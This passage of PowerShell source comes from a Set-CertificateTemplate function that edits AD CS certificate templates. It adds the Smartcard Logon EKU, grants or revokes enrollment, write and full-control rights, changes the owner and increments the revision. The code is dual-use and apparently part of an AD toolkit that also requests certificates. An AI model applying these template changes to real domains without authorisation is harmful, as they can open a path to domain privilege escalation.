                        $Modifications += "Added Smartcard Logon EKU (1.3.6.1.4.1.311.20.2.2) for PKINIT"
                    }
                    else {
                        Write-Log "[Set-CertificateTemplate] Smartcard Logon EKU already present"
                        $Modifications += "Smartcard Logon EKU already present (no change)"
                    }
                }
            }

            # Increment revision FIRST before ACL modifications
            # Certificate templates require revision increment for ANY change, this must be done BEFORE ACL modifications to avoid constraint violations
            if ($GrantEnrollment -or $GrantFullControl -or $GrantWrite -or $RevokeEnrollment -or $SetOwner -or $GrantAutoEnroll) {
                Write-Log "[Set-CertificateTemplate] Incrementing revision before ACL modifications"

                $CurrentRevision = if ($TemplateInfo.revision) {
                    [int]$TemplateInfo.revision
                } else { 0 }

                $NewRevision = $CurrentRevision + 1
                Write-Log "[Set-CertificateTemplate] Revision: $CurrentRevision -> $NewRevision"

                $null = Set-DomainObject -Identity $TemplateDN -Set @{'revision' = $NewRevision} -SearchBase $TemplatesBase
                Write-Log "[Set-CertificateTemplate] Successfully incremented revision to $NewRevision"
            }

            # ACL Modifications
            if ($GrantEnrollment -or $GrantFullControl -or $GrantWrite -or $RevokeEnrollment -or $SetOwner -or $GrantAutoEnroll) {
                Write-Log "[Set-CertificateTemplate] Processing ACL modifications"

                if ($GrantEnrollment) {
                    if ($PSCmdlet.ShouldProcess($TemplateName, "Grant Certificate-Enrollment to $GrantEnrollment") -eq $true) {
                        Write-Log "[Set-CertificateTemplate] Granting Certificate-Enrollment to $GrantEnrollment"

                        try {
                            $result = Set-DomainObject -Identity $TemplateDN `
                                                        -GrantACE `
                                                        -Principal $GrantEnrollment `
                                                        -ExtendedRight 'CertEnroll' `
                                                        -SearchBase $TemplatesBase `
                                                        -ErrorAction Stop

                            if ($result) {
                                $Modifications += "Granted Certificate-Enrollment to $GrantEnrollment"
                                Write-Log "[Set-CertificateTemplate] Successfully granted Certificate-Enrollment to $GrantEnrollment"
                            }
                            else {
                                # Set-DomainObject returned false (commit failed)
                                Write-Warning "[Set-CertificateTemplate] ACL modification failed - this may be an AD CS LDAP limitation"
                                Write-Warning "[Set-CertificateTemplate] Try using LDAPS (-UseLDAPS) or use certutil.exe for ACL modifications"
                                $Modifications += "Failed to grant Certificate-Enrollment (LDAP constraint)"
                            }
                        }
                        catch {
                            Write-Warning "[Set-CertificateTemplate] Failed to grant Certificate-Enrollment: $_"
                            Write-Warning "[Set-CertificateTemplate] Certificate template ACL modifications via LDAP may require LDAPS"
                            $Modifications += "Failed to grant Certificate-Enrollment to $GrantEnrollment"
                        }
                    }
                }

                if ($GrantFullControl) {
                    if ($PSCmdlet.ShouldProcess($TemplateName, "Grant Full Control to $GrantFullControl") -eq $true) {
                        Write-Log "[Set-CertificateTemplate] Granting Full Control to $GrantFullControl"

                        try {
                            $result = Set-DomainObject -Identity $TemplateDN `
                                                       -GrantACE `
                                                       -Principal $GrantFullControl `
                                                       -Rights 'GenericAll' `
                                                       -SearchBase $TemplatesBase `
                                                       -ErrorAction Stop

                            if ($result) {
                                $Modifications += "Granted Full Control to $GrantFullControl"
                                Write-Log "[Set-CertificateTemplate] Successfully granted Full Control to $GrantFullControl"
                            }
                            else {
                                Write-Warning "[Set-CertificateTemplate] ACL modification failed - this may be an AD CS LDAP limitation"
                                $Modifications += "Failed to grant Full Control (LDAP constraint)"
                            }
                        }
                        catch {
                            Write-Warning "[Set-CertificateTemplate] Failed to grant Full Control: $_"
                            $Modifications += "Failed to grant Full Control to $GrantFullControl"
                        }
                    }
                }

                if ($GrantWrite) {
                    if ($PSCmdlet.ShouldProcess($TemplateName, "Grant WriteProperty to $GrantWrite") -eq $true) {
                        Write-Log "[Set-CertificateTemplate] Granting WriteProperty to $GrantWrite"

                        try {
                            $result = Set-DomainObject -Identity $TemplateDN `
                                                       -GrantACE `
                                                       -Principal $GrantWrite `
                                                       -Rights 'WriteProperty' `
                                                       -SearchBase $TemplatesBase `
                                                       -ErrorAction Stop

                            if ($result) {
                                $Modifications += "Granted WriteProperty to $GrantWrite"
                                Write-Log "[Set-CertificateTemplate] Successfully granted WriteProperty to $GrantWrite"
                            }
                            else {
                                Write-Warning "[Set-CertificateTemplate] ACL modification failed - this may be an AD CS LDAP limitation"
                                $Modifications += "Failed to grant WriteProperty (LDAP constraint)"
                            }
                        }
                        catch {
                            Write-Warning "[Set-CertificateTemplate] Failed to grant WriteProperty: $_"
                            $Modifications += "Failed to grant WriteProperty to $GrantWrite"
                        }
                    }
                }

                if ($RevokeEnrollment) {
                    if ($PSCmdlet.ShouldProcess($TemplateName, "Revoke Certificate-Enrollment from $RevokeEnrollment") -eq $true) {
                        Write-Log "[Set-CertificateTemplate] Revoking Certificate-Enrollment from $RevokeEnrollment"

                        try {
                            $result = Set-DomainObject -Identity $TemplateDN `
                                                       -RevokeACE `
                                                       -Principal $RevokeEnrollment `
                                                       -ExtendedRight 'CertEnroll' `
                                                       -SearchBase $TemplatesBase `
                                                       -ErrorAction Stop

                            if ($result) {
                                $Modifications += "Revoked Certificate-Enrollment from $RevokeEnrollment"
                                Write-Log "[Set-CertificateTemplate] Successfully revoked Certificate-Enrollment from $RevokeEnrollment"
                            }
                            else {
                                Write-Warning "[Set-CertificateTemplate] ACL modification failed - this may be an AD CS LDAP limitation"
                                $Modifications += "Failed to revoke Certificate-Enrollment (LDAP constraint)"
                            }
                        }
                        catch {
                            Write-Warning "[Set-CertificateTemplate] Failed to revoke Certificate-Enrollment: $_"
                            $Modifications += "Failed to revoke Certificate-Enrollment from $RevokeEnrollment"
                        }
                    }
                }

                # SetOwner - Change template owner
                if ($SetOwner) {
                    if ($PSCmdlet.ShouldProcess($TemplateName, "Set Owner to $SetOwner") -eq $true) {
                        Write-Log "[Set-CertificateTemplate] Setting owner to $SetOwner"

                        try {
                            $result = Set-DomainObject -Identity $TemplateDN `
                                                       -SetOwner `
                                                       -Principal $SetOwner `
                                                       -SearchBase $TemplatesBase `
                                                       -ErrorAction Stop

                            if ($result) {
                                $Modifications += "Changed owner to $SetOwner"
                                Write-Log "[Set-CertificateTemplate] Successfully changed owner to $SetOwner"
                            }
                            else {
                                Write-Warning "[Set-CertificateTemplate] Owner modification failed - this may require TakeOwnership permission"
                                $Modifications += "Failed to change owner (insufficient permissions)"
                            }
                        }
                        catch {
                            Write-Warning "[Set-CertificateTemplate] Failed to change owner: $_"
                            $Modifications += "Failed to change owner to $SetOwner"
                        }
                    }
                }

                # GrantAutoEnroll - Grant Certificate-AutoEnrollment extended right
                if ($GrantAutoEnroll) {
                    if ($PSCmdlet.ShouldProcess($TemplateName, "Grant Certificate-AutoEnrollment to $GrantAutoEnroll") -eq $true) {
                        Write-Log "[Set-CertificateTemplate] Granting Certificate-AutoEnrollment to $GrantAutoEnroll"

                        try {
                            $result = Set-DomainObject -Identity $TemplateDN `
                                                       -GrantACE `
                                                       -Principal $GrantAutoEnroll `
                                                       -ExtendedRight 'CertAutoEnroll' `
                                                       -SearchBase $TemplatesBase `
                                                       -ErrorAction Stop

                            if ($result) {
                                $Modifications += "Granted Certificate-AutoEnrollment to $GrantAutoEnroll"
                                Write-Log "[Set-CertificateTemplate] Successfully granted Certificate-AutoEnrollment to $GrantAutoEnroll"
                            }
                            else {
                                Write-Warning "[Set-CertificateTemplate] ACL modification failed - this may be an AD CS LDAP limitation"
                                $Modifications += "Failed to grant Certificate-AutoEnrollment (LDAP constraint)"
                            }
                        }
                        catch {
                            Write-Warning "[Set-CertificateTemplate] Failed to grant Certificate-AutoEnrollment: $_"
                            $Modifications += "Failed to grant Certificate-AutoEnrollment to $GrantAutoEnroll"
                        }
                    }
                }
            }

            # Increment revision attribute (for non-ACL modifications)
            # Certificate templates require revision to be incremented on ANY modification
            # This is an AD CS constraint - without it, commits will fail
            $ACLModificationsMade = ($GrantEnrollment -or $GrantFullControl -or $GrantWrite -or $RevokeEnrollment -or $SetOwner -or $GrantAutoEnroll)

            if ($Modifications.Count -gt 0 -and -not $ACLModificationsMade) {
                Write-Log "[Set-CertificateTemplate] Incrementing template revision (non-ACL modifications)"

                $CurrentRevision = if ($TemplateInfo.revision) {
                    [int]$TemplateInfo.revision
                } else { 0 }

                $NewRevision = $CurrentRevision + 1
                Write-Log "[Set-CertificateTemplate] Revision: $CurrentRevision -> $NewRevision"

                $null = Set-DomainObject -Identity $TemplateDN -Set @{'revision' = $NewRevision} -SearchBase $TemplatesBase
                Write-Log "[Set-CertificateTemplate] Successfully incremented revision to $NewRevision"
            }

            # Success - Show modification summary and call Get-CertificateTemplate for output
            Show-Line "Template modified successfully: $TemplateName" -Class Hint
            Show-Line "Modifications applied: $($Modifications -join ', ')"

            # Use Get-CertificateTemplate to display the updated template
            Get-CertificateTemplate -Identity $Identity -ShowAll

        } catch {
            $ErrorMessage = $_.Exception.Message

            # Permission errors: show warning and re-throw so callers (e.g. Request-ADCSCertificate) can abort early
            if ($ErrorMessage -match "Insufficient permissions to modify template") {
                Write-Warning "[!] $ErrorMessage"
                throw
            }

            # Determine error type and show appropriate message (using centralized Show-Error)
            if ($ErrorMessage -match "Access is denied|Insufficient rights|UnauthorizedAccessException") {
                Show-Error -Type Permission -Message "modify template" -Target $Identity -Reason $ErrorMessage
            }
            elseif ($ErrorMessage -match "not found|does not exist") {
                Show-Error -Type NotFound -Message "Certificate template" -Target $Identity
            }
            else {
                Show-Error -Type Operation -Message "Failed to modify template" -Target $Identity -Reason $ErrorMessage
            }

            return $null
        }
    }

    end {
        Write-Log "[Set-CertificateTemplate] Template modification complete"
    }
}
